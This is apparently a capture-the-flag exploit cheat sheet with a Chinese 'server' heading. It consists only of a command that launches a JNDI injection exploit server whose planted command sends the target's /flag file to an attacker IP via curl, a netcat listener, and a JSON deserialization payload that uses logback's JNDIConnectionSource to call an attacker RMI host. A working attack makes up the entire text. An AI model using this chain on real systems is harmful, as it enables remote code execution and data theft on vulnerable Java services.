# 服务器
```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://IP:PORT -File=@/flag' -A "IP"

nc -lvvp PORT

```

# payload

```json
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://IP:1099/6dzonl"}]
```
